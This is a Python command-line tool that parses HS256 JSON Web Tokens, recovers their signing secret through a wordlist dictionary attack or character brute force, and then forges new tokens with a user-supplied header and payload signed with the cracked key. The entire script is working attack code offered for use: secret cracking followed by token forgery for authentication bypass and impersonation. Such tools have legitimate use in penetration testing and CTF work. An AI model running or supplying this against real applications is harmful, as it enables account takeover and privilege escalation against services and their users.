#! /usr/bin/env python3

# A simple utility to decode/crack/forge JSON Web Tokens.
# Currently only works with JWTs using HS256.

import hmac, hashlib, base64, sys, string
from itertools import product

# Separate header/payload/signature
def jwtParser(jwt=sys.argv[1]):
    jwt_list = jwt.encode().split(b".")
    return tuple(jwt_list[0:3])

# Decode header/payload
def jwtInfo():
    header, payload = jwtParser()[0:2]
    while True:
        try:
            header = base64.urlsafe_b64decode(header).decode('utf-8')
            break
        except:
            header += b"="
    while True:
        try:
            payload = base64.urlsafe_b64decode(payload).decode('utf-8')
            break
        except:
            payload += b"="
    return header, payload

# Check for HS256
def algCheck():
    if "HS256" in jwtInfo()[0]:
        return True
    else:
        return False
    
# Generate signature from header and payload    
def sigGen(key, header=jwtParser()[0], payload=jwtParser()[1]):
    msg = header + b"." + payload
    hm = hmac.new(key, msg, hashlib.sha256).digest()
    ehm = base64.urlsafe_b64encode(hm).rstrip(b'=')
    return ehm

# JWT Key Dictionary Attack
def jwtCrack():
    linecount = len(open(sys.argv[2], "rb").readlines())
    with open(sys.argv[2], "rb") as f:
        wordlist = f.readlines()
    valid_sig = jwtParser()[2]
    count = 0
    found = False
    for word in wordlist:
        count += 1
        print("Searching for valid key: %s / %s" % (count, linecount), end='\r')
        key = word.rstrip(b"\n")
        if sigGen(key) == valid_sig: 
            found = True
            valid_key = key.decode('utf-8')
            print("\n" + "Secret Found: ", valid_key)
            break
    if found == False:
        print("\n" + "No secret was discovered.")
        return False
    else:
        return valid_key

# Generate character set for brute-force
def genChars(charset, maxlen):
    return product(charset, repeat=maxlen)

# JWT Key Brute-Force Attack
def jwtBrute():
    minlen = int(input("Enter minimum key length: "))
    maxlen = int(input("Enter maximum key length: "))
    chars = string.ascii_letters + string.digits + str('!@#$%^&*()_-+=?')
    count = 0
    found = False
    while found == False and minlen <= maxlen:
        for key in genChars(chars, minlen):
            count += 1
            key = "".join(key).encode().rstrip(b"\n")
            print("Attempting to brute-force valid key.", "Total Tries: %s Key: %s Length: %s" % (count, key, minlen), end='\r')
            if sigGen(key) == jwtParser()[2]:
                found = True
                valid_key = key.decode('utf-8')
                print("\n" + "Secret Found: ", valid_key)
                break
        minlen += 1
    if found == False:
        print("\n" + "No secret was discovered.")
        return False
    else:
        return valid_key

# Forge new JWT with discovered key
def jwtForge(key):
    key = key.encode()
    h = input("Enter header (leave blank for default): ")
    if len(h) < 5:
        h = h = str('{"typ":"JWT","alg":"HS256"}')
    p = input("Enter payload: ")
    eh = base64.b64encode(h.encode()).rstrip(b"=")
    ep = base64.b64encode(p.encode()).rstrip(b"=")
    jwt = eh + b"." + ep + b"." + sigGen(key, eh, ep)
    return jwt.decode()

if __name__ == "__main__":
    if len(sys.argv) == 1 or len(sys.argv) > 3:
        print("Usage: %s <jwt> [<wordlist>]" % sys.argv[0])
    elif algCheck() == False:
        print("Only JWTs using HS256 are supported at this time.")
    else:
        h, p = jwtInfo()
        print("Header:\n" + h + "\n\nPayload:\n" + p + "\n")
        if len(sys.argv) == 2:
            vkey = jwtBrute()
            if vkey != False:
                if input("Forge new token with discovered key?: ") in ('y', 'yes'):
                    print(jwtForge(vkey))
        else:
            vkey = jwtCrack()
            if vkey != False:
                if input("Forge new token with discovered key?: ") in ('y', 'yes'):
                    print(jwtForge(vkey))
            else:
                if input("Would you like to try brute-forcing the key? ") in ('y', 'yes'):
                    vkey = jwtBrute()
                    if vkey != False:
                        if input("Forge new token with discovered key?: ") in ('y', 'yes'):
                            print(jwtForge(vkey))
        
